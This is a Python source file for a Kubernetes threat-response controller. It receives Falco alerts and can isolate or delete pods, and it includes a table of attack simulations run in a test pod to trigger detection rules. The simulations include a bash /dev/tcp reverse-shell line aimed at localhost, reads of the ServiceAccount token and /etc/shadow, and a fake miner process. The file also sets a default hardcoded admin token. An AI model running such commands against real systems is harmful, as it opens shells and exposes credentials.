"""RTM response controller (Phase 2).

Receives Falco alerts from Falcosidekick, normalizes RTM alerts,
stores them in a 200-item ring buffer, evaluates response decisions,
and executes graduated responses (isolate_network, kill_pod) with safety guards.
"""
import json
import logging
import os
import re
import threading
import time
from collections import deque
from typing import Optional

import uuid
import uvicorn
from fastapi import FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from kubernetes import client, config
from kubernetes.stream import stream
from pydantic import BaseModel, Field

from decision import DecisionEngine, evaluate_dry_run

MAX_ALERTS = 200
RTM_ID_RE = re.compile(r"^(RTM-\d{3})\b")

logging.basicConfig(level=logging.INFO, format="%(message)s")
logger = logging.getLogger("rtm-controller")

# Configuration from environment
DRY_RUN_ENV = os.getenv("DRY_RUN", "true").lower() in ("true", "1", "yes")
ENFORCE_LABEL_SELECTOR = os.getenv("ENFORCE_LABEL_SELECTOR", "rtm.enforce=true")


def get_strategy() -> str:
    return os.getenv("STRATEGY", "graduated").lower()


# Initialize Kubernetes API client (fail gracefully in test/mock environments)
v1_api: Optional[client.CoreV1Api] = None
try:
    try:
        config.load_incluster_config()
    except Exception:
        config.load_kube_config()
    v1_api = client.CoreV1Api()
    logger.info("Kubernetes API client initialized successfully")
except Exception as e:
    logger.warning("Could not initialize Kubernetes client: %s (running in dry-run mode)", e)


def parse_alert(body: dict) -> Optional[dict]:
    """Return a normalized alert dict, or None if this is not an RTM rule."""
    rule = body.get("rule") or ""
    match = RTM_ID_RE.match(rule)
    if not match:
        return None
    raw_tags = body.get("tags") or []
    if isinstance(raw_tags, str):
        raw_tags = [t.strip() for t in raw_tags.split(",")]
    tags = [t for t in raw_tags if t]
    hint = next(
        (t[len("response_"):] for t in tags if t.startswith("response_")),
        "unknown",
    )
    fields = body.get("output_fields") or {}
    return {
        "ts": body.get("time"),
        "rtm_id": match.group(1),
        "rule": rule,
        "priority": body.get("priority"),
        "tags": tags,
        "response_hint": hint,
        "namespace": fields.get("k8s.ns.name"),
        "pod": fields.get("k8s.pod.name"),
        "container_id": fields.get("container.id"),
        "user": fields.get("user.name"),
        "cmdline": fields.get("proc.cmdline"),
        "hostname": body.get("hostname") or fields.get("hostname"),
        # Decision fields — populated after decision engine runs
        "received_at": None,
        "decided_at": None,
        "dedupe_suppressed": None,
        "distinct_rule_count_in_window": None,
        "strategy": None,
        "dry_run": None,
        "action_taken": None,
        "gate_blocked_reason": None,
    }


class AlertStore:
    """Thread-safe ring buffer holding the most recent alerts."""

    def __init__(self, maxlen: int = MAX_ALERTS):
        self._items = deque(maxlen=maxlen)
        self._lock = threading.Lock()

    def add(self, alert: dict) -> None:
        with self._lock:
            self._items.append(alert)

    def update_last(self, alert_obj_id: int, fields: dict) -> None:
        """Update a record in the ring buffer by object id (reference equality)."""
        with self._lock:
            for item in self._items:
                if id(item) == alert_obj_id:
                    item.update(fields)
                    return

    def recent(self) -> list:
        with self._lock:
            return list(self._items)

    def clear(self) -> None:
        with self._lock:
            self._items.clear()

    def __len__(self) -> int:
        with self._lock:
            return len(self._items)


store = AlertStore()
engine = DecisionEngine(strategy=get_strategy())

# Simulation scenarios configuration
simulation_lock = threading.Lock()

SIMULATION_SCENARIOS = {
    "E1": {
        "name": "Shell",
        "subtitle": "kubectl exec sh",
        "expected_rules": ["RTM-001"],
        "command": ["sh", "-c", "echo rtm-test-e1-shell"],
        "desc": "Spawns a shell inside the test victim container (TTY not required)",
    },
    "E2": {
        "name": "Token Read",
        "subtitle": "fires RTM-001 + RTM-003",
        "expected_rules": ["RTM-001", "RTM-003"],
        "command": ["sh", "-c", "cat /var/run/secrets/kubernetes.io/serviceaccount/token > /dev/null"],
        "desc": "Accesses ServiceAccount token path (output discarded for credential safety)",
    },
    "E3": {
        "name": "Binary in /tmp",
        "subtitle": "RTM-005",
        "expected_rules": ["RTM-005"],
        "command": ["sh", "-c", "cp /bin/ls /tmp/vx && /tmp/vx / > /dev/null 2>&1; rm -f /tmp/vx"],
        "desc": "Executes harmless test binary (/bin/ls) from /tmp and cleans up",
    },
    "E4": {
        "name": "Reverse Shell",
        "subtitle": "RTM-007",
        "expected_rules": ["RTM-007"],
        "command": ["bash", "-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || true"],
        "desc": "Safe lab simulation of /dev/tcp redirection pattern (immediate localhost RST)",
    },
    "E5": {
        "name": "Sensitive File",
        "subtitle": "RTM-002",
        "expected_rules": ["RTM-002"],
        "command": ["sh", "-c", "cat /etc/shadow >/dev/null 2>&1 || true"],
        "desc": "Attempts read of /etc/shadow (output discarded for credential safety)",
    },
    "E6": {
        "name": "Package Tool",
        "subtitle": "RTM-004",
        "expected_rules": ["RTM-004"],
        "command": ["sh", "-c", "pip --version >/dev/null 2>&1"],
        "desc": "Executes package manager/download tool (pip --version) inside container",
    },
    "E7": {
        "name": "Public Egress",
        "subtitle": "RTM-006",
        "expected_rules": ["RTM-006"],
        "command": ["curl", "-m", "2", "-s", "-o", "/dev/null", "https://1.1.1.1"],
        "desc": "Attempts outbound connect to public IP (1.1.1.1:443 with 2s timeout)",
    },
    "E8": {
        "name": "Crypto Miner",
        "subtitle": "RTM-008",
        "expected_rules": ["RTM-008"],
        "command": ["sh", "-c", "cp /bin/sleep /tmp/xmrig && /tmp/xmrig 0.1 && rm -f /tmp/xmrig"],
        "desc": "Harmless process-name stand-in (/bin/sleep copied to /tmp/xmrig) and cleaned up",
    },
}

class SimulationRequest(BaseModel):
    scenario: str = Field(..., description="Predefined scenario identifier: E1, E2, E3, E4, E5, E6, E7, or E8")

app = FastAPI(title="rtm-controller")

# ---------------------------------------------------------------------------
# CORS — dev/demo only. Allows the dashboard (http://localhost:5173 or
# http://localhost:8080) to poll GET endpoints from a browser.
# Restricted to GET only; no write verbs are exposed to the frontend.
# ---------------------------------------------------------------------------
app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "http://localhost:5173",
        "http://localhost:8080",
        "http://localhost:8000",
        "http://127.0.0.1:5173",
        "http://127.0.0.1:8080",
        "http://127.0.0.1:8000",
        "null",   # allows file:// origins (index.html opened directly in browser)
    ],
    allow_methods=["GET", "POST", "OPTIONS"],
    allow_headers=["*"],
)


@app.get("/healthz")
def healthz():
    return {"status": "ok", "service": "rtm-controller"}


@app.get("/config")
def get_config():
    """Read-only: return current strategy/dry_run/enforce_label_selector from env.
    No write operations. Safe to expose to the dashboard."""
    return {
        "strategy": get_strategy(),
        "dry_run": DRY_RUN_ENV,
        "enforce_label_selector": ENFORCE_LABEL_SELECTOR,
    }


@app.get("/alerts/recent")
def alerts_recent():
    alerts = store.recent()
    return {"count": len(alerts), "alerts": alerts}


@app.get("/pods/status")
def pods_status(namespace: str = "shop"):
    """Read-only: return pod name, labels (rtm.enforce, rtm.tier), phase, restart count.
    Uses the existing Kubernetes Role which already grants get/list on pods in
    namespace shop. No new RBAC verbs are required."""
    if v1_api is None:
        return {"error": "kubernetes_client_unavailable", "pods": []}
    try:
        pod_list = v1_api.list_namespaced_pod(namespace=namespace)
    except Exception as e:
        return {"error": str(e), "pods": []}

    result = []
    for pod in pod_list.items:
        labels = pod.metadata.labels or {}
        containers = pod.status.container_statuses or []
        restart_count = sum(c.restart_count for c in containers)
        result.append({
            "name": pod.metadata.name,
            "namespace": pod.metadata.namespace,
            "phase": pod.status.phase,
            "labels": labels,
            "rtm_enforce": labels.get("rtm.enforce"),
            "rtm_tier": labels.get("rtm.tier"),
            "restart_count": restart_count,
        })
    return {"namespace": namespace, "pods": result}


@app.get("/simulate/scenarios")
def get_simulation_scenarios():
    """Return available predefined simulation scenarios."""
    return {
        "scenarios": [
            {
                "id": k,
                "name": v["name"],
                "subtitle": v["subtitle"],
                "expected_rules": v["expected_rules"],
                "desc": v["desc"],
            }
            for k, v in SIMULATION_SCENARIOS.items()
        ]
    }


@app.post("/simulate")
def inject_threat(req: SimulationRequest):
    """Trigger a controlled threat simulation on the designated test workload in namespace 'shop'.

    Safety invariants:
    - Only predefined scenarios (E1, E2, E3, E4) are accepted.
    - Commands are strictly server-side constants. Arbitrary commands, parameters, or targets are rejected.
    - Execution is restricted to the test namespace 'shop' and pod matching 'app=victim'.
    - Concurrency is guarded via a non-blocking lock to prevent overlapping runs.
    - Output is redirected/discarded so credentials or secrets are never exposed.
    - Alerts are NOT synthesized here; detection is confirmed only via the real Falco -> Falcosidekick pipeline.
    """
    scenario_id = req.scenario.strip().upper() if req.scenario else ""
    if scenario_id not in SIMULATION_SCENARIOS:
        raise HTTPException(
            status_code=400,
            detail=f"Invalid scenario '{req.scenario}'. Allowed values: {', '.join(sorted(SIMULATION_SCENARIOS.keys()))}",
        )

    scen = SIMULATION_SCENARIOS[scenario_id]

    if v1_api is None:
        raise HTTPException(
            status_code=503,
            detail="Kubernetes client unavailable on controller; cannot execute simulation.",
        )

    # Concurrency check
    acquired = simulation_lock.acquire(blocking=False)
    if not acquired:
        raise HTTPException(
            status_code=409,
            detail="A threat simulation is already in progress. Please wait for it to complete.",
        )

    try:
        # Locate designated victim workload in shop namespace
        try:
            pod_list = v1_api.list_namespaced_pod(namespace="shop", label_selector="app=victim")
        except Exception as e:
            raise HTTPException(status_code=500, detail=f"Failed to query Kubernetes pods: {e}")

        running_pods = [
            p for p in pod_list.items
            if p.status.phase == "Running" and not getattr(p.metadata, "deletion_timestamp", None)
        ]

        if not running_pods:
            raise HTTPException(
                status_code=503,
                detail="Designated test victim pod ('app=victim') is not running in namespace 'shop'.",
            )

        target_pod = running_pods[0].metadata.name
        sim_id = f"sim-{uuid.uuid4().hex[:8]}"
        start_ts = time.time()

        logger.info(
            "Starting threat simulation %s scenario=%s target=shop/%s",
            sim_id, scenario_id, target_pod
        )

        try:
            exec_api = client.CoreV1Api(client.ApiClient())
            resp = stream(
                exec_api.connect_post_namespaced_pod_exec,
                name=target_pod,
                namespace="shop",
                command=scen["command"],
                stderr=True,
                stdin=False,
                stdout=True,
                tty=False,
                _request_timeout=15,
            )
        except Exception as e:
            logger.error("Simulation %s execution failed: %s", sim_id, e)
            raise HTTPException(
                status_code=500,
                detail=f"Failed to execute simulation {scenario_id} in pod {target_pod}: {str(e)}",
            )

        duration = time.time() - start_ts
        logger.info(
            "Completed threat simulation %s scenario=%s in %.2fs",
            sim_id, scenario_id, duration
        )

        return {
            "status": "completed",
            "simulation_id": sim_id,
            "scenario": scenario_id,
            "scenario_name": scen["name"],
            "subtitle": scen["subtitle"],
            "expected_rules": scen["expected_rules"],
            "target": {
                "namespace": "shop",
                "pod": target_pod,
                "container": "victim",
            },
            "executed_at": start_ts,
            "duration_s": round(duration, 3),
            "message": f"Simulation {scenario_id} completed successfully in shop/{target_pod}. Awaiting Falco detection.",
        }
    finally:
        simulation_lock.release()


@app.post("/alerts")
async def receive_alert(request: Request):
    received_ts = time.time()
    body = await request.json()
    alert = parse_alert(body)
    if alert is None:
        logger.info(
            "non-rtm alert ignored rule=%s priority=%s",
            body.get("rule", "unknown"),
            body.get("priority", "unknown"),
        )
        return {"received": True, "stored": False}

    # Stamp received_at before adding to store
    alert["received_at"] = received_ts

    # Store EVERY RTM alert in 200-item ring buffer before any filtering
    store.add(alert)
    alert_obj_id = id(alert)
    logger.info(json.dumps(
        {k: v for k, v in alert.items() if k not in (
            "received_at", "decided_at", "dedupe_suppressed",
            "distinct_rule_count_in_window", "strategy",
            "dry_run", "action_taken", "gate_blocked_reason"
        )},
        separators=(",", ":")
    ))

    # Sync strategy from current environment
    current_strategy = get_strategy()
    engine.strategy = current_strategy

    # Evaluate decision
    decision = engine.decide(alert)

    if decision is None:
        # Dedupe suppressed — record this on the stored alert
        store.update_last(alert_obj_id, {
            "dedupe_suppressed": True,
            "decided_at": time.time(),
            "strategy": current_strategy,
            "dry_run": DRY_RUN_ENV,
            "action_taken": "suppressed",
            "gate_blocked_reason": None,
            "distinct_rule_count_in_window": None,
        })
        return {"received": True, "stored": True, "action": None}

    pod = decision["pod"]
    action = decision["action"]
    alert_ts = decision["alert_ts"]
    received_ts_dec = decision["received_ts"]
    distinct_count = len(decision.get("rtm_ids", []))

    # Determine safety / dry_run
    pod_labels = {}
    gate_blocked_reason = None
    if v1_api is not None:
        try:
            pod_obj = v1_api.read_namespaced_pod(name=pod, namespace="shop")
            pod_labels = pod_obj.metadata.labels or {}
        except Exception as e:
            logger.warning("Could not read pod %s in shop: %s", pod, e)

    is_dry = evaluate_dry_run(
        pod_labels=pod_labels,
        dry_run_env=DRY_RUN_ENV,
        selector=ENFORCE_LABEL_SELECTOR,
        strategy=current_strategy,
    )

    # Compute gate_blocked_reason for dashboard display
    if str(pod_labels.get("rtm.enforce", "")).lower() != "true":
        gate_blocked_reason = f"pod_missing_label:{ENFORCE_LABEL_SELECTOR}"
    elif current_strategy == "detect_only":
        gate_blocked_reason = "strategy_detect_only"
    elif DRY_RUN_ENV:
        gate_blocked_reason = "dry_run_env=true"

    if is_dry:
        logger.info("STRATEGY=%s WOULD %s pod %s", current_strategy, action, pod)
    else:
        gate_blocked_reason = None  # enforcement is live — no block
        logger.info("STRATEGY=%s ACTION %s pod %s", current_strategy, action, pod)
        if current_strategy != "detect_only" and v1_api is not None:
            if action == "isolate_network":
                try:
                    v1_api.patch_namespaced_pod(
                        name=pod,
                        namespace="shop",
                        body={"metadata": {"labels": {"rtm.tier": "restrict"}}},
                    )
                except Exception as e:
                    logger.error("Failed to patch pod %s: %s", pod, e)
            elif action == "kill_pod":
                try:
                    v1_api.delete_namespaced_pod(name=pod, namespace="shop")
                except Exception as e:
                    logger.error("Failed to delete pod %s: %s", pod, e)

    decided_at = time.time()

    # Update the stored alert record with full decision metadata
    store.update_last(alert_obj_id, {
        "decided_at": decided_at,
        "dedupe_suppressed": False,
        "distinct_rule_count_in_window": distinct_count,
        "strategy": current_strategy,
        "dry_run": is_dry,
        "action_taken": action,
        "gate_blocked_reason": gate_blocked_reason,
    })

    # One JSON log line per decision, including strategy
    decision_record = {
        "strategy": current_strategy,
        "pod": pod,
        "rtm_ids": decision["rtm_ids"],
        "action": action,
        "dry_run": is_dry,
        "gate_blocked_reason": gate_blocked_reason,
        "alert_ts": alert_ts,
        "received_ts": received_ts_dec,
        "action_done_ts": decided_at,
        "distinct_rule_count_in_window": distinct_count,
    }
    logger.info(json.dumps(decision_record, separators=(",", ":")))

    return {"received": True, "stored": True, "decision": decision_record}



# ---------------------------------------------------------------------------
# Admin: Reset test results
# Protected by a static token delivered via ADMIN_TOKEN env var.
# In demo / local environments the token defaults to "rtm-reset-dev-token".
# Set a strong random value when running in any shared or production cluster.
# ---------------------------------------------------------------------------
ADMIN_TOKEN: str = os.getenv("ADMIN_TOKEN", "rtm-reset-dev-token")


@app.post("/admin/reset-test-results")
async def reset_test_results(request: Request):
    """Clear all in-memory test state for a clean evaluation run.

    Clears:
    - Alert ring buffer (store)
    - Decision engine dedupe timestamps (_pod_last_seen)
    - Decision engine pod event history (_pod_history)
    - Decision engine already-taken action tracking (_actions_taken)

    Does NOT:
    - Change STRATEGY, DRY_RUN, window sizes, or enforcement selectors.
    - Affect Falco's own kernel/log state.
    - Reverse previously executed Kubernetes mitigation actions.
    - Cancel any running simulation.

    Authorization: requires the header  X-RTM-Admin-Token: <ADMIN_TOKEN>
    """
    token = request.headers.get("X-RTM-Admin-Token", "")
    if not token or token != ADMIN_TOKEN:
        raise HTTPException(
            status_code=401,
            detail="Missing or invalid X-RTM-Admin-Token header.",
        )

    # Acquire simulation_lock briefly so we don't reset mid-simulation.
    acquired = simulation_lock.acquire(blocking=True, timeout=5)
    if not acquired:
        raise HTTPException(
            status_code=409,
            detail="A simulation is currently running; retry after it completes.",
        )
    try:
        store.clear()
        with threading.Lock():
            engine._pod_history.clear()
            engine._pod_last_seen.clear()
            engine._actions_taken.clear()
        cleared_at = time.time()
    finally:
        simulation_lock.release()

    logger.info("Admin reset: alert store and decision engine state cleared at %.3f", cleared_at)
    return {
        "status": "reset_complete",
        "cleared_at": cleared_at,
        "message": (
            "Alert history, deduplication timestamps, pod event history, and "
            "action-tracking state have been cleared. "
            "Strategy, windows, and safety settings are unchanged."
        ),
    }


if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
